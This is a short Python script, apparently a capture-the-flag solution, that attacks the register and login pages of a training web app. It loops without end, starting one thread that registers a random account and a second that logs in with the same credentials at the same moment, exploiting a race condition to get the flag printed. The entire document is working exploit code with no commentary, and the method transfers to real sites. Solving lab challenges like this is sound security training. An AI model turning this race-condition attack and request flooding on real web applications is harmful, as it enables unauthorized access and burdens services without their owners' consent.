import sys
import requests
from time import sleep
from threading import Thread
import string
import random

URL = "http://aart.training.jinblack.it"


def id_generator(size=8, chars=string.ascii_uppercase + string.digits):
    return ''.join(random.choice(chars) for _ in range(size))


def register(user, password):
    target = '{}/register.php'.format(URL)
    data = {
        "username": user,
        "password": password
    }
    r = requests.post(target, data=data)
    #print(r)
    if "SUCCESS" in r.text:
        return True
    else:
        return False


def login(user, password):
    target = '{}/login.php'.format(URL)
    data = {
        "username": user,
        "password": password
    }
    r = requests.post(target, data=data)
    #print(r)

    if 'flag' in r.text:
        print(r.text)
        sys.exit(0)


while True:
    user = id_generator()
    password = id_generator()

    reg_thread = Thread(target=register, args=(user, password))
    log_thread = Thread(target=login, args=(user, password))

    reg_thread.start()
    log_thread.start()

    sleep(.05)
